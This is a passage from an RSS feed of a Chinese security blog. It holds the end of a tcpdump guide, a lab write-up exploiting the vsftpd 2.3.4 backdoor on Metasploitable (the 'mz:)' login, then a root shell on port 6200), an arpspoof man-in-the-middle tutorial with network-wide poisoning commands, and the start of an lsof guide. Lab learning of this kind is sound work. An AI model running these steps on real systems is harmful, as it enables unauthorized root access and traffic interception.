&lt;h3 id="52-捕获特定方向的数据包">5.2 捕获特定方向的数据包
&lt;/h3>&lt;ul>
&lt;li>指定数据包的传输方向。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 inbound
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 outbound
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="53-使用表达式过滤">5.3 使用表达式过滤
&lt;/h3>&lt;ul>
&lt;li>使用复杂的表达式进行过滤，例如捕获特定协议和端口的组合。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 &lt;span class="s1">&amp;#39;tcp port 80 and (tcp[((tcp[12:1] &amp;amp; 0xf0) &amp;gt;&amp;gt; 2):4] = 0x47455420)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="54-实时分析与输出控制">5.4 实时分析与输出控制
&lt;/h3>&lt;ul>
&lt;li>使用 &lt;code>-l&lt;/code> 参数可以让 tcpdump 的输出立即发送到管道命令，适用于实时分析。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -l port &lt;span class="m">80&lt;/span> &lt;span class="p">|&lt;/span> grep &lt;span class="s1">&amp;#39;Server:&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="六实战案例">六、实战案例
&lt;/h2>&lt;h3 id="61-捕获特定主机的http流量">6.1 捕获特定主机的HTTP流量
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -n -X tcp port &lt;span class="m">80&lt;/span> and host 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;code>-n&lt;/code>：不解析主机名。&lt;/li>
&lt;li>&lt;code>-X&lt;/code>：以十六进制和ASCII格式显示内容。&lt;/li>
&lt;li>&lt;code>tcp port 80&lt;/code>：筛选TCP协议的80端口（HTTP）。&lt;/li>
&lt;li>&lt;code>host 192.168.1.1&lt;/code>：指定主机IP。&lt;/li>
&lt;/ul>
&lt;h3 id="62-分析网络延迟">6.2 分析网络延迟
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -tttt -c &lt;span class="m">100&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;code>-tttt&lt;/code>：显示时间戳，精确到秒。&lt;/li>
&lt;li>&lt;code>-c 100&lt;/code>：捕获100个数据包。&lt;/li>
&lt;li>通过观察时间戳，可以分析网络延迟情况。&lt;/li>
&lt;/ul>
&lt;h3 id="63-捕获并保存数据包">6.3 捕获并保存数据包
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -w capture.pcap
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>将捕获的数据包保存到&lt;code>capture.pcap&lt;/code>文件中，后续可以使用Wireshark等工具进行详细分析。&lt;/li>
&lt;/ul>
&lt;h2 id="七注意事项">七、注意事项
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>权限问题&lt;/strong>：TCPdump 需要管理员权限才能运行。&lt;/li>
&lt;li>&lt;strong>性能影响&lt;/strong>：在高流量的网络环境中，TCPdump 可能会对系统性能产生一定影响。&lt;/li>
&lt;li>&lt;strong>隐私问题&lt;/strong>：捕获的数据包可能包含敏感信息，请确保合法使用。&lt;/li>
&lt;/ol></description></item><item><title>FTP笑脸漏洞复现</title><link>https://souljian.cn/p/745211567/</link><pubDate>Mon, 21 Apr 2025 12:59:27 +0800</pubDate><guid>https://souljian.cn/p/745211567/</guid><description>&lt;p>&lt;strong>实验笔记：vsftpd 2.3.4 笑脸漏洞复现&lt;/strong>&lt;/p>
&lt;h2 id="实验目标">&lt;strong>实验目标&lt;/strong>
&lt;/h2>&lt;p>复现 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，通过该漏洞获取靶机的 root 权限。&lt;/p>
&lt;h2 id="实验环境">&lt;strong>实验环境&lt;/strong>
&lt;/h2>&lt;ul>
&lt;li>&lt;strong>攻击机&lt;/strong>：Kali Linux&lt;/li>
&lt;li>&lt;strong>靶机&lt;/strong>：Metasploitable Linux 2.0.0&lt;/li>
&lt;/ul>
&lt;h2 id="实验步骤">&lt;strong>实验步骤&lt;/strong>
&lt;/h2>&lt;h3 id="一环境搭建">&lt;strong>一、环境搭建&lt;/strong>
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>下载并启动靶机&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>下载 Metasploitable Linux 2.0.0 镜像文件。&lt;/li>
&lt;li>解压后使用 VMware 打开并启动虚拟机。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>登录靶机并修改 root 密码&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>使用普通用户 &lt;code>msfadmin&lt;/code> 登录，密码为 &lt;code>msfadmin&lt;/code>。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>修改 root 用户的密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfadmin@metasploitable:~$ sudo passwd root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>按提示输入新密码。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="二漏洞复现">&lt;strong>二、漏洞复现&lt;/strong>
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>端口扫描&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在 Kali Linux 上打开终端，使用 nmap 扫描靶机的开放端口：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 192.168.xx.xx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>（将 &lt;code>192.168.xx.xx&lt;/code> 替换为靶机的实际 IP 地址）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>确认靶机开放了 21 (FTP) 端口。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221111-20250416221113-c45aigt.png"
loading="lazy"
alt="局部截取_20250416_221111"
>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>扫描 FTP 服务版本&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>使用 nmap 扫描 FTP 服务的版本信息：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sV 192.168.xx.xx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>确认靶机运行的是 vsftpd 2.3.4 版本。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221133-20250416221138-tl3olrd.png"
loading="lazy"
alt="局部截取_20250416_221133"
>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>触发漏洞&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在 Kali Linux 上使用 Netcat (nc) 连接靶机的 21 端口：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.xx.xx &lt;span class="m">21&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>输入以下命令（注意手动输入）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user mz:)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pass aaaaa
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>此时靶机的 6200 端口会自动开启。保持当前终端状态，不要关闭。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221204-20250416221212-na23h58.png"
loading="lazy"
alt="局部截取_20250416_221204"
>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>验证 6200 端口&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在 Kali Linux 上另起一个终端，使用 nmap 扫描 6200 端口：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p &lt;span class="m">6200&lt;/span> 192.168.xx.xx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>确认 6200 端口已开启。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221242-20250416221245-a36mo8g.png"
loading="lazy"
alt="局部截取_20250416_221242"
>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>获取 root 权限&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>使用 Netcat 连接靶机的 6200 端口：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.xx.xx &lt;span class="m">6200&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>成功连接后，即可以 root 身份登录靶机。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221315-20250416221318-gied7ac.png"
loading="lazy"
alt="局部截取_20250416_221315"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>注意：连接后执行ls查看是都已经进去半终端&lt;/p>
&lt;/li>
&lt;li>
&lt;p>确认进入半终端可执行python -c &amp;lsquo;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo; 调用完整终端&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="三实验注意事项">&lt;strong>三、实验注意事项&lt;/strong>
&lt;/h3>&lt;ul>
&lt;li>如果在实验过程中遇到问题，可以尝试重启靶机。&lt;/li>
&lt;li>确保在触发漏洞后保持 Netcat 连接状态，否则 6200 端口可能会关闭。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>&lt;strong>实验总结：&lt;/strong>
本次实验通过 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。&lt;/p></description></item><item><title>Arpspoof命令使用</title><link>https://souljian.cn/p/745203237/</link><pubDate>Mon, 21 Apr 2025 10:40:37 +0800</pubDate><guid>https://souljian.cn/p/745203237/</guid><description>&lt;h2 id="一简介">一、简介
&lt;/h2>&lt;p>&lt;code>arpspoof&lt;/code> 是一款用于 ARP 欺骗的工具，能够发送伪造的 ARP 数据包，欺骗网络中的设备，使其将攻击者的设备误认为是目标设备。这通常用于中间人攻击（MITM），例如捕获网络流量或篡改数据。&lt;/p>
&lt;h2 id="二安装">二、安装
&lt;/h2>&lt;h3 id="一kali-linux">（一）Kali Linux
&lt;/h3>&lt;p>&lt;code>arpspoof&lt;/code> 在 Kali Linux 中通常已经预装。如果没有安装，可以通过安装 &lt;code>dsniff&lt;/code> 包来获取：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt-get update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt-get install dsniff
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="二ubuntu">（二）Ubuntu
&lt;/h3>&lt;p>在 Ubuntu 上，&lt;code>arpspoof&lt;/code> 也包含在 &lt;code>dsniff&lt;/code> 包中：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt-get update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt-get install dsniff
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="三centos">（三）CentOS
&lt;/h3>&lt;p>在 CentOS 上，可以通过安装 &lt;code>dsniff&lt;/code> 包来获取 &lt;code>arpspoof&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo yum install epel-release
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo yum install dsniff
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>安装完成后，可以通过以下命令验证 &lt;code>arpspoof&lt;/code> 是否安装成功：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">arpspoof --help
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="三基本语法">三、基本语法
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">arpspoof &lt;span class="o">[&lt;/span>选项&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>目标 IP&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="四常用选项">四、常用选项
&lt;/h2>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>选项&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>-i &amp;lt;接口&amp;gt;&lt;/code>&lt;/td>
&lt;td>指定要使用的网络接口。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-t &amp;lt;目标 IP&amp;gt;&lt;/code>&lt;/td>
&lt;td>指定一个特殊的、将被 ARP 毒化的主机。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-r&lt;/code>&lt;/td>
&lt;td>毒化两个主机（目标和主机）以捕获两个方向的网络流量。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>`-c own&lt;/td>
&lt;td>host&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="五使用示例">五、使用示例
&lt;/h2>&lt;h3 id="一欺骗单个目标">（一）欺骗单个目标
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将目标主机（192.168.1.100）的 ARP 表项中的默认网关（192.168.1.1）指向攻击者的设备。&lt;/p>
&lt;h3 id="二自动欺骗网关">（二）自动欺骗网关
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo arpspoof -i eth0 -r 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>自动将目标主机（192.168.1.100）的 ARP 表项中的默认网关指向攻击者的设备。&lt;/p>
&lt;h3 id="三欺骗整个网络">（三）欺骗整个网络
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将整个网络中的设备的 ARP 表项中的默认网关指向攻击者的设备。&lt;/p>
&lt;h3 id="四恢复-arp-表项">（四）恢复 ARP 表项
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo arpspoof -i eth0 -c both -t 192.168.1.100 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>恢复目标主机（192.168.1.100）的 ARP 表项，使其恢复正常。&lt;/p>
&lt;h2 id="六注意事项">六、注意事项
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>权限问题&lt;/strong>：&lt;code>arpspoof&lt;/code> 需要管理员权限才能运行。&lt;/li>
&lt;li>&lt;strong>网络环境&lt;/strong>：某些网络环境可能检测到 ARP 欺骗行为并采取措施。&lt;/li>
&lt;li>&lt;strong>法律问题&lt;/strong>：未经授权的 ARP 欺骗行为可能违反法律法规。&lt;/li>
&lt;li>&lt;strong>网络拓扑&lt;/strong>：在复杂的网络环境中，可能需要调整攻击策略以确保有效欺骗。&lt;/li>
&lt;li>&lt;strong>工具替代&lt;/strong>：如果 &lt;code>arpspoof&lt;/code> 不可用，可以使用其他工具（如 &lt;code>ettercap&lt;/code> 或 &lt;code>bettercap&lt;/code>）来实现类似功能。&lt;/li>
&lt;/ol>
&lt;h2 id="七总结">七、总结
&lt;/h2>&lt;p>&lt;code>arpspoof&lt;/code> 是一个功能强大的 ARP 欺骗工具，常用于中间人攻击（MITM）。通过掌握基本语法和高级用法，可以快速实现网络流量的捕获和篡改，帮助进行网络安全测试和分析。&lt;/p></description></item><item><title>Lsof命令使用</title><link>https://souljian.cn/p/745203152/</link><pubDate>Mon, 21 Apr 2025 10:39:12 +0800</pubDate><guid>https://souljian.cn/p/745203152/</guid><description>&lt;h1 id="">
&lt;/h1>&lt;h2 id="一lsof-简介">一、&lt;code>lsof&lt;/code> 简介
&lt;/h2>&lt;p>&lt;code>lsof&lt;/code>（List Open Files）是一个功能强大的命令行工具，用于列出当前系统中所有打开的文件及其相关进程。在 Unix 和 Linux 系统中，几乎所有事物（包括常规文件、目录、网络连接、设备等）都被视为文件，因此 &lt;code>lsof&lt;/code> 在多种场景下都非常有用。&lt;/p>
&lt;h2 id="二安装-lsof">二、安装 &lt;code>lsof&lt;/code>
&lt;/h2>&lt;p>在大多数 Linux 发行版中，&lt;code>lsof&lt;/code> 可通过包管理器安装：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Debian/Ubuntu&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install lsof
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>CentOS/RHEL&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo yum install lsof
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>Arch Linux&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo pacman -S lsof
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="三基本语法">三、基本语法
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof &lt;span class="o">[&lt;/span>选项&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>文件名或目录&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="四常用选项">四、常用选项
&lt;/h2>&lt;h3 id="一按进程过滤">（一）按进程过滤
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;code>-p &amp;lt;PID&amp;gt;&lt;/code>：按进程 ID 过滤。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
